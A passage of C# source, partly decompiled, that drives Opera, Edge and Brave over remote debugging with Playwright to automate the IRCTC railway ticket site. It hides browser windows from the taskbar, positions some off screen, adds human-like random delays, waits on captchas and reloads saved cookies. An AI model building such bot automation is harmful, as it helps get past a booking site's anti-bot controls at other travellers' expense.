                "[Cleanup Error] " + ex.Message
            );
        }
    }
    private void KillOldBraveByProfile(string profilePath)
    {
        if (string.IsNullOrEmpty(profilePath))
            return;

        try
        {
            Console.WriteLine("[Cleanup] " + profilePath + " wali Brave profile ko close kar rahe hain...");

            string queryString = "SELECT ProcessId, CommandLine FROM Win32_Process WHERE Name='brave.exe'";

            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(queryString))
            {
                foreach (ManagementObject item in searcher.Get())
                {
                    string cmd = item["CommandLine"]?.ToString() ?? "";

                    if (cmd.IndexOf(profilePath, StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        int pid = Convert.ToInt32(item["ProcessId"]);

                        try
                        {
                            Process proc = Process.GetProcessById(pid);

                            if (!proc.HasExited)
                            {
                                proc.Kill(); // .NET 5+ me: proc.Kill(true);
                                proc.WaitForExit(1000);
                            }

                            Console.WriteLine($"[Success] Brave Process (PID: {pid}) killed.");
                        }
                        catch
                        {
                            // ignore per-process errors
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[Cleanup Error]: " + ex.ToString());
        }
    }
    private void KillOldBrowserByProfile(string profilePath, TargetBrowser targetBrowser)
    {
        if (string.IsNullOrEmpty(profilePath))
        {
            return;
        }
        string text2;
        if (targetBrowser != 0)
        {
            string text = "chrome.exe";
            text2 = text;
        }
        else
        {
            string text3 = "msedge.exe";
            text2 = text3;
        }
        string text4 = text2;
        try
        {
            string format = "[Cleanup] {0} ki {1} wali profile ko close kar rahe hain...";
            Console.WriteLine(string.Format(format, targetBrowser, profilePath));
            string text5 = "SELECT ProcessId, CommandLine FROM Win32_Process WHERE Name='";
            string text6 = "'";
            using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(text5 + text4 + text6);
            foreach (ManagementObject item in managementObjectSearcher.Get())
            {
                string propertyName = "CommandLine";
                object obj = item[propertyName];
                object obj2;
                if (obj == null)
                {
                    obj2 = null;
                }
                else
                {
                    obj2 = obj.ToString();
                    if (obj2 != null)
                    {
                        goto IL_00b9;
                    }
                }
                obj2 = "";
                goto IL_00b9;
            IL_00b9:
                if (((string)obj2).IndexOf(profilePath, StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    string propertyName2 = "ProcessId";
                    int num = Convert.ToInt32(item[propertyName2]);
                    try
                    {
                        Process processById = Process.GetProcessById(num);
                        processById.Kill();
                        processById.WaitForExit(1000);
                        string format2 = "[Success] {0} Process (PID: {1}) killed.";
                        Console.WriteLine(string.Format(format2, targetBrowser, num));
                    }
                    catch
                    {
                    }
                }
            }
        }
        catch (Exception ex)
        {
            string text7 = "[Cleanup Error]: ";
            Console.WriteLine(text7 + ex.ToString());
        }
    }
    private void KillBraveProcesses()
    {
        try
        {
            string[] processNames = new string[]
            {
            "brave",
            "bravebrowser"
            };

            foreach (string name in processNames)
            {
                var processes = Process.GetProcessesByName(name);

                foreach (var proc in processes)
                {
                    try
                    {
                        if (!proc.HasExited)
                        {
                            proc.Kill();
                            proc.WaitForExit(2000);
                        }
                    }
                    catch
                    {
                        // ignore individual process kill errors
                    }
                }
            }

            Thread.Sleep(2000);
        }
        catch (Exception ex)
        {
            Console.WriteLine("KillBraveProcesses error: " + ex.ToString());
        }
    }
    private void KillAllEdgeProcesses()
    {
        try
        {
            string[] processNames = new string[]
            {
            "msedge",
            "msedgewebview2",
            "MicrosoftEdge",
            "MicrosoftEdgeCP"
            };

            foreach (string name in processNames)
            {
                var processes = Process.GetProcessesByName(name);

                foreach (var proc in processes)
                {
                    try
                    {
                        if (!proc.HasExited)
                        {
                            proc.Kill();
                            proc.WaitForExit(2000);
                        }
                    }
                    catch
                    {
                    }
                }
            }
            Thread.Sleep(2000);
        }
        catch (Exception ex)
        {
            Console.WriteLine("KillAllEdgeProcesses error: " + ex.ToString());
        }
    }
    private string GetOperaPath()
    {
        // 1. Registry (64-bit + 32-bit दोनों check)
        string[] regPaths =
        {
        @"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\opera.exe",
        @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\opera.exe"
    };

        foreach (var regPath in regPaths)
        {
            using (var key = Registry.LocalMachine.OpenSubKey(regPath))
            {
                if (key != null)
                {
                    var value = key.GetValue("");
                    if (value != null)
                    {
                        string fullPath = value.ToString();
                        if (File.Exists(fullPath))
                            return fullPath;
                    }
                }
            }
        }

        // 2. Current User registry (some installs यहाँ होते हैं)
        foreach (var regPath in regPaths)
        {
            using (var key = Registry.CurrentUser.OpenSubKey(regPath))
            {
                if (key != null)
                {
                    var value = key.GetValue("");
                    if (value != null)
                    {
                        string fullPath = value.ToString();
                        if (File.Exists(fullPath))
                            return fullPath;
                    }
                }
            }
        }

        // 3. Common install locations fallback
        string[] paths =
        {
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\Opera\launcher.exe"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\Opera\opera.exe"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Opera\launcher.exe"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Opera\launcher.exe")
    };

        foreach (var path in paths)
        {
            if (File.Exists(path))
                return path;
        }

        // 4. Last fallback (slow search – optional)
        string drive = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 2); // C:
        var files = Directory.GetFiles(drive + "\\", "launcher.exe", SearchOption.AllDirectories)
                             .Where(f => f.ToLower().Contains("opera"))
                             .ToList();

        if (files.Count > 0)
            return files[0];

        throw new Exception("Opera browser not found on this system!");
    }

    internal IPage StartOperaAndConnect_opera(ref string userDataDir00, Rectangle rect, ref IPage page)
    {
        Random random = new Random();
        int num = 0;
        Process process = null;

        while (true)
        {
            try
            {
                int freeTcpPort = GetFreeTcpPort();

                if (!string.IsNullOrEmpty(userDataDir00))
                {
                    KillOldOperaByProfile(userDataDir00); // same method काम करेगा
                }
                else
                {
                    string tempPath = Path.GetTempPath();
                    string path = Path.Combine(tempPath, "OperaProfiles");
                    userDataDir00 = Path.Combine(path, "Profile_" + Guid.NewGuid().ToString("N"));

                    if (!Directory.Exists(userDataDir00))
                        Directory.CreateDirectory(userDataDir00);
                }

                Thread.Sleep(1000);

                string operaPath = GetOperaPath(); // ✅ CHANGE HERE

                string args = $"--remote-debugging-port={freeTcpPort} " +
                              $"--remote-debugging-address=127.0.0.1 " +
                              $"--user-data-dir=\"{userDataDir00}\" " +
                              $"--no-first-run --disable-session-crashed-bubble " +
                              $"--disable-infobars --disable-sync " +
                              $"--app=https://www.irctc.co.in/nget/train-search";

                if (num == 0)
                {
                    process = Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c start \"\" \"{operaPath}\" {args}",
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        Verb = "runas"
                    });
                }
                else
                {
                    process = Process.Start(new ProcessStartInfo
                    {
                        FileName = operaPath,
                        Arguments = args,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Normal
                    });
                }

                Thread.Sleep(5000);

                // Port check
                bool connected = false;
                int retry = 0;

                while (!connected && retry < 5)
                {
                    try
                    {
                        using TcpClient client = new TcpClient();
                        client.Connect("127.0.0.1", freeTcpPort);
                        connected = true;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        retry++;
                    }
                }

                if (!connected)
                    throw new Exception("Opera connection failed");

                var playwright = Playwright.CreateAsync().GetAwaiter().GetResult();
                var browser = playwright.Chromium;

                var context = browser.ConnectOverCDPAsync($"http://127.0.0.1:{freeTcpPort}").GetAwaiter().GetResult().Contexts[0];
                page = context.Pages.Count > 0 ? context.Pages[0] : context.NewPageAsync().GetAwaiter().GetResult();
                var session = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                var window = session.SendAsync("Browser.getWindowForTarget").GetAwaiter().GetResult();
                int windowId = window.Value.GetProperty("windowId").GetInt32();
                session.SendAsync("Browser.setWindowBounds", new Dictionary<string, object>
                {
                    ["windowId"] = windowId,
                    ["bounds"] = new Dictionary<string, object>
                    {
                        ["left"] = rect.X,
                        ["top"] = rect.Y,
                        ["width"] = rect.Width,
                        ["height"] = rect.Height,
                        ["windowState"] = "normal"
                    }
                }).GetAwaiter().GetResult();
                page.GotoAsync("https://www.irctc.co.in/nget/train-search").GetAwaiter().GetResult();
                BrowserLoded = true;
            }
            catch
            {
                if (process != null && !process.HasExited)
                {
                    try { process.Kill(); } catch { }
                }

                if (num == 0)
                {
                    num++;
                    continue;
                }

                BrowserLoded = false;
            }
            break;
        }

        return page;
    }
    internal IPage StartEdgeAndConnectopera(ref string userDataDir00, string directlogin, Rectangle rect, ref IPage page)
    {
        Random random = new Random();
        int num = 0;
        Process process = null;
        while (true)
        {
            try
            {
                int freeTcpPort = GetFreeTcpPort();
                if (!string.IsNullOrEmpty(userDataDir00))
                {
                    KillOldOperaByProfile(userDataDir00);
                }
                else
                {
                    string tempPath = Path.GetTempPath();
                    string path = "EdgeProfiles";
                    string path2 = Path.Combine(tempPath, path);
                    string text = "Profile_";
                    Guid guid = Guid.NewGuid();
                    string text2 = "N";
                    userDataDir00 = Path.Combine(path2, text + guid.ToString(text2));
                    if (!Directory.Exists(userDataDir00))
                    {
                        Directory.CreateDirectory(userDataDir00);
                    }
                }
                Thread.Sleep(1000);
                Convert.ToBase64String(Encoding.UTF8.GetBytes(blankHtml));
                string edgePath = GetOperaPath();
                string format = "--remote-debugging-port={0} ";
                string text3 = string.Format(format, freeTcpPort);
                string text4 = "--remote-debugging-address=127.0.0.1 --user-data-dir=\"";
                string text5 = userDataDir00;
                string text6 = "\" --no-first-run --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --disable-features=msEdgeSync --app=https://www.irctc.co.in/nget/assets/images/logo.png";
                string text7 = text3 + text4 + text5 + text6;
                if (num == 0)
                {
                    string text8 = "/c start \"\" \"";
                    string text9 = "\" ";
                    string arguments = text8 + edgePath + text9 + text7;
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    string fileName = "cmd.exe";
                    processStartInfo.FileName = fileName;
                    processStartInfo.Arguments = arguments;
                    processStartInfo.CreateNoWindow = true;
                    processStartInfo.UseShellExecute = false;
                    string verb = "runas";
                    processStartInfo.Verb = verb;
                    process = Process.Start(processStartInfo);
                }
                else
                {
                    process = Process.Start(new ProcessStartInfo
                    {
                        FileName = edgePath,
                        Arguments = text7,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Normal
                    });
                }
                Thread.Sleep(5000);
                bool flag = false;
                int num2 = 0;
                string value = "[Info] Waiting for Edge port to open...";
                Console.WriteLine(value);
                while (!flag && num2 < 5)
                {
                    try
                    {
                        using TcpClient tcpClient = new TcpClient();
                        string hostname = "127.0.0.1";
                        tcpClient.Connect(hostname, freeTcpPort);
                        flag = true;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        num2++;
                    }
                }
                if (!flag)
                {
                    string text10 = "Edge Connection Faield";
                    MessageBox.Show(text10);
                }
                IBrowserType chromium = Playwright.CreateAsync().GetAwaiter().GetResult().Chromium;
                string format2 = "http://127.0.0.1:{0}";
                IBrowserContext browserContext = chromium.ConnectOverCDPAsync(string.Format(format2, freeTcpPort)).GetAwaiter().GetResult().Contexts[0];
                if (browserContext.Pages.Count <= 0)
                {
                    page = browserContext.NewPageAsync().GetAwaiter().GetResult();
                }
                else
                {
                    page = browserContext.Pages[0];
                }
                IntPtr intPtr = EdgeTaskbarHider.FindEdgeWindowByUserDataDir(userDataDir00);
                if (intPtr != IntPtr.Zero)
                {
                    EdgeTaskbarHider.HideFromTaskbar(intPtr);
                }
                try
                {
                    ICDPSession result = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    string method = "Browser.getWindowForTarget";
                    JsonElement? result2 = result.SendAsync(method).GetAwaiter().GetResult();
                    if (result2.HasValue)
                    {
                        JsonElement value2 = result2.Value;
                        string propertyName = "windowId";
                        int @int = value2.GetProperty(propertyName).GetInt32();
                        int num3 = random.Next(225, 250);
                        int width = rect.Width;
                        int num4 = rect.Height - num3;
                        int x = rect.X;
                        int y = rect.Y;
                        Dictionary<string, object> dictionary = new Dictionary<string, object>();
                        string key = "windowId";
                        dictionary.Add(key, @int);
                        string key2 = "bounds";
                        Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                        string key3 = "left";
                        dictionary2.Add(key3, x);
                        string key4 = "top";
                        dictionary2.Add(key4, y);
                        string key5 = "width";
                        dictionary2.Add(key5, width);
                        string key6 = "height";
                        dictionary2.Add(key6, num4);
                        string key7 = "windowState";
                        string value3 = "normal";
                        dictionary2.Add(key7, value3);
                        dictionary.Add(key2, dictionary2);
                        Dictionary<string, object> args = dictionary;
                        string method2 = "Browser.setWindowBounds";
                        result.SendAsync(method2, args).GetAwaiter().GetResult();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
                CaptureIRCTCRequests(page);
                if (directlogin != "True")
                {
                    LoadCookiesFromJsonToBrowseropera(browserContext);
                }
                IPage page2 = page;
                string url = "https://www.irctc.co.in/nget/train-search";
                page2.GotoAsync(url, new PageGotoOptions
                {
                    WaitUntil = WaitUntilState.DOMContentLoaded
                }).GetAwaiter().GetResult();
                Thread.Sleep(5000);
                BrowserLoded = true;
            }
            catch (Exception)
            {
                if (process != null && !process.HasExited)
                {
                    try
                    {
                        process.Kill();
                    }
                    catch
                    {
                    }
                }
                if (num == 0)
                {
                    num++;
                    continue;
                }
                BrowserLoded = false;
            }
            break;
        }
        return page;
    }

    internal IPage StartEdgeAndConnectopera_Beta(ref string userDataDir00, string directlogin, Rectangle rect, ref IPage page)
    {
        Random random = new Random();
        int num = 0;
        Process process = null;
        while (true)
        {
            try
            {
                int freeTcpPort = GetFreeTcpPort();
                if (!string.IsNullOrEmpty(userDataDir00))
                {
                    KillOldOperaByProfile(userDataDir00);
                }
                else
                {
                    string tempPath = Path.GetTempPath();
                    string path = "EdgeProfiles";
                    string path2 = Path.Combine(tempPath, path);
                    string text = "Profile_";
                    Guid guid = Guid.NewGuid();
                    string text2 = "N";
                    userDataDir00 = Path.Combine(path2, text + guid.ToString(text2));
                    if (!Directory.Exists(userDataDir00))
                    {
                        Directory.CreateDirectory(userDataDir00);
                    }
                }
                Thread.Sleep(1000);
                Convert.ToBase64String(Encoding.UTF8.GetBytes(blankHtml));
                string edgePath = GetOperaPath();
                string format = "--remote-debugging-port={0} ";
                string text3 = string.Format(format, freeTcpPort);
                string text4 = "--remote-debugging-address=127.0.0.1 --user-data-dir=\"";
                string text5 = userDataDir00;
                string text6 = "\" --no-first-run --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --disable-features=msEdgeSync --app=https://www.irctc.co.in/nget/assets/images/logo.png";
                string text7 = text3 + text4 + text5 + text6;
                if (num == 0)
                {
                    string text8 = "/c start \"\" \"";
                    string text9 = "\" ";
                    string arguments = text8 + edgePath + text9 + text7;
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    string fileName = "cmd.exe";
                    processStartInfo.FileName = fileName;
                    processStartInfo.Arguments = arguments;
                    processStartInfo.CreateNoWindow = true;
                    processStartInfo.UseShellExecute = false;
                    string verb = "runas";
                    processStartInfo.Verb = verb;
                    process = Process.Start(processStartInfo);
                }
                else
                {
                    process = Process.Start(new ProcessStartInfo
                    {
                        FileName = edgePath,
                        Arguments = text7,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Normal
                    });
                }
                Thread.Sleep(5000);
                bool flag = false;
                int num2 = 0;
                string value = "[Info] Waiting for Edge port to open...";
                Console.WriteLine(value);
                while (!flag && num2 < 5)
                {
                    try
                    {
                        using TcpClient tcpClient = new TcpClient();
                        string hostname = "127.0.0.1";
                        tcpClient.Connect(hostname, freeTcpPort);
                        flag = true;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        num2++;
                    }
                }
                if (!flag)
                {
                    string text10 = "Edge Connection Faield";
                    MessageBox.Show(text10);
                }
                IBrowserType chromium = Playwright.CreateAsync().GetAwaiter().GetResult().Chromium;
                string format2 = "http://127.0.0.1:{0}";
                IBrowserContext browserContext = chromium.ConnectOverCDPAsync(string.Format(format2, freeTcpPort)).GetAwaiter().GetResult().Contexts[0];
                if (browserContext.Pages.Count <= 0)
                {
                    page = browserContext.NewPageAsync().GetAwaiter().GetResult();
                }
                else
                {
                    page = browserContext.Pages[0];
                }
                IntPtr intPtr = EdgeTaskbarHider.FindEdgeWindowByUserDataDir(userDataDir00);
                if (intPtr != IntPtr.Zero)
                {
                    EdgeTaskbarHider.HideFromTaskbar(intPtr);
                }
                try
                {
                    ICDPSession result = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    string method = "Browser.getWindowForTarget";
                    JsonElement? result2 = result.SendAsync(method).GetAwaiter().GetResult();
                    if (result2.HasValue)
                    {
                        JsonElement value2 = result2.Value;
                        string propertyName = "windowId";
                        int @int = value2.GetProperty(propertyName).GetInt32();
                        int num3 = random.Next(225, 250);
                        int width = rect.Width;
                        int num4 = rect.Height - num3;
                        int x = rect.X;
                        int y = rect.Y;
                        Dictionary<string, object> dictionary = new Dictionary<string, object>();
                        string key = "windowId";
                        dictionary.Add(key, @int);
                        string key2 = "bounds";
                        Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                        string key3 = "left";
                        dictionary2.Add(key3, x);
                        string key4 = "top";
                        dictionary2.Add(key4, y);
                        string key5 = "width";
                        dictionary2.Add(key5, width);
                        string key6 = "height";
                        dictionary2.Add(key6, num4);
                        string key7 = "windowState";
                        string value3 = "normal";
                        dictionary2.Add(key7, value3);
                        dictionary.Add(key2, dictionary2);
                        Dictionary<string, object> args = dictionary;
                        string method2 = "Browser.setWindowBounds";
                        result.SendAsync(method2, args).GetAwaiter().GetResult();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
                CaptureIRCTCRequests(page);
                if (directlogin != "True")
                {
                    LoadCookiesFromJsonToBrowseropera(browserContext);
                }
                IPage page2 = page;
                string url = "https://www.irctc.co.in/eticket/train-search";
                page2.GotoAsync(url, new PageGotoOptions
                {
                    WaitUntil = WaitUntilState.DOMContentLoaded
                }).GetAwaiter().GetResult();
                Thread.Sleep(5000);
                BrowserLoded = true;
            }
            catch (Exception)
            {
                if (process != null && !process.HasExited)
                {
                    try
                    {
                        process.Kill();
                    }
                    catch
                    {
                    }
                }
                if (num == 0)
                {
                    num++;
                    continue;
                }
                BrowserLoded = false;
            }
            break;
        }
        return page;
    }


    [DllImport("user32.dll")]
    static extern bool MoveWindow(
    IntPtr hWnd,
    int X,
    int Y,
    int nWidth,
    int nHeight,
    bool bRepaint
);

    [DllImport("user32.dll")]
    static extern bool ShowWindow(
        IntPtr hWnd,
        int nCmdShow
    );

    [DllImport("user32.dll")]
    static extern bool SetForegroundWindow(
        IntPtr hWnd
    );

    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int nIndex);

    internal void StartEdgeNormal(ref string userDataDir00, Rectangle rect)
    {
        Random random = new Random();
        Process process = null;

        try
        {
            /* =========================================
               CREATE / USE PROFILE
            ========================================= */

            if (string.IsNullOrEmpty(userDataDir00))
            {
                string tempPath = Path.GetTempPath();

                string profileRoot = Path.Combine(
                    tempPath,
                    "EdgeProfiles"
                );

                userDataDir00 = Path.Combine(
                    profileRoot,
                    "Profile_" + Guid.NewGuid().ToString("N")
                );

                if (!Directory.Exists(userDataDir00))
                {
                    Directory.CreateDirectory(userDataDir00);
                }
            }

            Thread.Sleep(1000);

            /* =========================================
               EDGE PATH
            ========================================= */

            string edgePath = GetEdgePath();

            /* =========================================
               REMOVE REMOTE DEBUGGING
            ========================================= */

            string edgeArgs =
                $"--user-data-dir=\"{userDataDir00}\" " +
                "--no-first-run " +
                "--disable-session-crashed-bubble " +
                "--disable-save-password-bubble " +
                "--disable-infobars " +
                "--disable-sync " +
                "--start-maximized " +
                "https://www.irctc.co.in";

            /* =========================================
               START NORMAL EDGE
            ========================================= */

            string arguments =
                "/c start \"\" \"" +
                edgePath +
                "\" " +
                edgeArgs;

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = arguments,
                CreateNoWindow = true,
                UseShellExecute = false,
                Verb = "runas"
            };

            process = Process.Start(psi);

            /* =========================================
               WAIT BROWSER LOAD
            ========================================= */

            Thread.Sleep(8000);

            /* =========================================
               FIND EDGE WINDOW
            ========================================= */

            IntPtr hwnd =
                EdgeTaskbarHider.FindEdgeWindowByUserDataDir(userDataDir00);

            if (hwnd != IntPtr.Zero)
            {
                try
                {
                    int taskbarHeight = random.Next(225, 250);

                    MoveWindow(
                        hwnd,
                        rect.X,
                        rect.Y,
                        rect.Width,
                        rect.Height - taskbarHeight,
                        true
                    );

                    ShowWindow(hwnd, 5);

                    SetForegroundWindow(hwnd);

                    EdgeTaskbarHider.HideFromTaskbar(hwnd);
                }
                catch
                {
                }
            }

            /* =========================================
               HUMAN LIKE WAIT
            ========================================= */

            Thread.Sleep(random.Next(3000, 5000));

            /* =========================================
               OPEN TRAIN SEARCH
            ========================================= */

            SendKeys.SendWait("^l");

            Thread.Sleep(1000);

            SendKeys.SendWait(
                "https://www.irctc.co.in/nget/train-search"
            );

            Thread.Sleep(500);

            SendKeys.SendWait("{ENTER}");

            /* =========================================
               WAIT CAPTCHA
            ========================================= */

            Thread.Sleep(8000);

            BrowserLoded = true;
        }
        catch (Exception ex)
        {
            BrowserLoded = false;

            try
            {
                if (process != null && !process.HasExited)
                {
                    process.Kill();
                }
            }
            catch
            {
            }

            MessageBox.Show(ex.ToString());
        }
    }
    private void DisableBravePasswordManager(
        string userDataDir)
    {
        string defaultDirectory =
            Path.Combine(
                userDataDir,
                "Default");


        Directory.CreateDirectory(
            defaultDirectory);


        string preferencesPath =
            Path.Combine(
                defaultDirectory,
                "Preferences");


        string contents =
            "{\r\n" +
            "  \"credentials_enable_service\": false,\r\n" +
            "  \"profile\": {\r\n" +
            "    \"password_manager_enabled\": false,\r\n" +
            "    \"password_manager_leak_detection\": false\r\n" +
            "  },\r\n" +
            "  \"autofill\": {\r\n" +
            "    \"enabled\": false\r\n" +
            "  }\r\n" +
            "}";


        File.WriteAllText(
            preferencesPath,
            contents);
    }
    private void DisableEdgePasswordManager(string userDataDir)
    {
        string text = Path.Combine(userDataDir, "Default");
        Directory.CreateDirectory(text);
        string path = Path.Combine(text, "Preferences");
        string contents = "{\r\n  \"credentials_enable_service\": false,\r\n  \"profile\": {\r\n    \"password_manager_enabled\": false,\r\n    \"password_manager_leak_detection\": false\r\n  },\r\n  \"autofill\": {\r\n    \"enabled\": false\r\n  }\r\n}";
        File.WriteAllText(path, contents);
    }
    internal IPage StartEdgeAndConnect_new(ref string userDataDir00, string directlogin, Rectangle rect, ref IPage page)
    {
        Random random = new Random();
        int num = 0;
        Process process = null;
        while (true)
        {
            try
            {
                int freeTcpPort = GetFreeTcpPort();
                if (!string.IsNullOrEmpty(userDataDir00))
                {
                    KillOldEdgeByProfile(userDataDir00);
                }
                else
                {
                    string tempPath = Path.GetTempPath();
                    string path = "EdgeProfiles";
                    string path2 = Path.Combine(tempPath, path);
                    string text = "Profile_";
                    Guid guid = Guid.NewGuid();
                    string text2 = "N";
                    userDataDir00 = Path.Combine(path2, text + guid.ToString(text2));
                    userDataDir00 = Path.Combine(Path.GetTempPath(), "uc_" + Guid.NewGuid().ToString("N"));
                    if (!Directory.Exists(userDataDir00))
                    {
                        Directory.CreateDirectory(userDataDir00);
                    }
                    DisableEdgePasswordManager(userDataDir00);
                }
                Thread.Sleep(1000);
                Convert.ToBase64String(Encoding.UTF8.GetBytes(blankHtml));

                // purani Edge window / restored session clear
                try { KillAllEdgeProcesses(); } catch { }

                string edgePath = GetEdgePath();
                string format = "--remote-debugging-port={0} ";
                string text3 = string.Format(format, freeTcpPort);
                string text4 = "--remote-debugging-address=127.0.0.1 --user-data-dir=\"";
                string text5 = userDataDir00;
                string text6 = "\" --no-first-run --no-default-browser-check --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --password-store=basic --disable-features=msEdgeFirstRunExperience,msEdgeSync,PasswordManagerEnabled --app=https://www.irctc.co.in/nget/train-search";
                int offsetY = random.Next(900, 1550);
                string text7 = text3 + text4 + text5 + text6 + " --window-position=" + rect.X + "," + (rect.Y + offsetY);
                if (num == 0)
                {
                    string text8 = "/c start \"\" \"";
                    string text9 = "\" ";
                    string arguments = text8 + edgePath + text9 + text7;
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    string fileName = "cmd.exe";
                    processStartInfo.FileName = fileName;
                    processStartInfo.Arguments = arguments;
                    processStartInfo.CreateNoWindow = true;
                    processStartInfo.UseShellExecute = false;
                    string verb = "runas";
                    processStartInfo.Verb = verb;
                    process = Process.Start(processStartInfo);
                }
                else
                {
                    process = Process.Start(new ProcessStartInfo
                    {
                        FileName = edgePath,
                        Arguments = text7,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Normal
                    });
                }
                Thread.Sleep(5000);
                bool flag = false;
                int num2 = 0;
                string value = "[Info] Waiting for Edge port to open...";
                Console.WriteLine(value);
                while (!flag && num2 < 5)
                {
                    try
                    {
                        using TcpClient tcpClient = new TcpClient();
                        string hostname = "127.0.0.1";
                        tcpClient.Connect(hostname, freeTcpPort);
                        flag = true;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        num2++;
                    }
                }
                if (!flag)
                {
                    string text10 = "Edge Connection Faield";
                    MessageBox.Show(text10);
                }
                IBrowserType chromium = Playwright.CreateAsync().GetAwaiter().GetResult()
                    .Chromium;
                string format2 = "http://127.0.0.1:{0}";
                IBrowserContext val = chromium.ConnectOverCDPAsync(string.Format(format2, freeTcpPort), (BrowserTypeConnectOverCDPOptions)null).GetAwaiter().GetResult()
                    .Contexts[0];
                // app window ka pehla tab use karo; extra restored tab band karo
                page = (val.Pages.Count > 0) ? val.Pages[0] : val.NewPageAsync().GetAwaiter().GetResult();
                foreach (IPage oldPg in val.Pages.ToList())
                {
                    if (oldPg != page)
                    {
                        try { oldPg.CloseAsync().GetAwaiter().GetResult(); } catch { }
                    }
                }
                IntPtr intPtr = EdgeTaskbarHider.FindEdgeWindowByUserDataDir(userDataDir00);
                if (intPtr != IntPtr.Zero)
                {
                    EdgeTaskbarHider.HideFromTaskbar(intPtr);
                }
                try
                {
                    ICDPSession result = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    string text11 = "Browser.getWindowForTarget";
                    JsonElement? result2 = result.SendAsync(text11, (Dictionary<string, object>)null).GetAwaiter().GetResult();
                    if (result2.HasValue)
                    {
                        JsonElement value2 = result2.Value;
                        string propertyName = "windowId";
                        int @int = value2.GetProperty(propertyName).GetInt32();
                        int num3 = random.Next(1, 20);
                        int width = rect.Width;
                        int num4 = rect.Height - num3;
                        int x = rect.X;
                        int y = rect.Y;
                        Dictionary<string, object> dictionary = new Dictionary<string, object>();
                        string key = "windowId";
                        dictionary.Add(key, @int);
                        string key2 = "bounds";
                        Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                        string key3 = "left";
                        dictionary2.Add(key3, x);
                        string key4 = "top";
                        dictionary2.Add(key4, y + offsetY);
                        string key5 = "width";
                        dictionary2.Add(key5, width);
                        string key6 = "height";
                        dictionary2.Add(key6, num4);
                        string key7 = "windowState";
                        string value3 = "normal";
                        dictionary2.Add(key7, value3);
                        dictionary.Add(key2, dictionary2);
                        Dictionary<string, object> args = dictionary;
                        string method2 = "Browser.setWindowBounds";
                        result.SendAsync(method2, args).GetAwaiter().GetResult();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
                CaptureIRCTCRequests(page);
                if (directlogin != "True")
                {
                    LoadCookiesFromJsonToBrowser(val);
                }
                IPage val2 = page;
                string text14 = "https://www.irctc.co.in/nget/train-search";
                IResponse result3 = val2.GotoAsync(text14, new PageGotoOptions
                {
                    WaitUntil = (WaitUntilState)1
                }).GetAwaiter().GetResult();
                Thread.Sleep(5000);
                if (result3 != null)
                {
                    string url = result3.Url;
                    int status = result3.Status;
                    Console.WriteLine("URL : " + url);
                    Console.WriteLine("Status : " + status);
                }
                string result4 = (val2.ContentAsync().GetAwaiter().GetResult() ?? "").ToLowerInvariant();
                if (!result4.Contains("book train tickets online instantly on irctc") && !result4.Contains("downtime message"))
                {
                    num++;
                    if (num >= 3)
                    {
                        BrowserLoded = false;
                        break;
                    }
                    try { if (process != null && !process.HasExited) process.Kill(); } catch { }
                    continue;
                }
                BrowserLoded = true;
                break;
            }
            catch (Exception)
            {
                if (process != null && !process.HasExited)
                {
                    try
                    {
                        process.Kill();
                    }
                    catch
                    {
                    }
                }
                if (num == 0)
                {
                    num++;
                    continue;
                }
                BrowserLoded = false;
                break;
            }
        }
        return page;
    }
    internal IPage StartEdgeAndConnect(ref string userDataDir00, string directlogin, Rectangle rect, ref IPage page)
    {
        Random random = new Random();
        int num = 0;
        Process process = null;
        while (true)
        {
            try
            {
                int freeTcpPort = GetFreeTcpPort();
                if (!string.IsNullOrEmpty(userDataDir00))
                {
                    KillOldEdgeByProfile(userDataDir00);
                }
                else
                {
                    string tempPath = Path.GetTempPath();
                    string path = "EdgeProfiles";
                    string path2 = Path.Combine(tempPath, path);
                    string text = "Profile_";
                    Guid guid = Guid.NewGuid();
                    string text2 = "N";
                    userDataDir00 = Path.Combine(path2, text + guid.ToString(text2));
                    userDataDir00 = Path.Combine(Path.GetTempPath(), "uc_" + Guid.NewGuid().ToString("N"));
                    if (!Directory.Exists(userDataDir00))
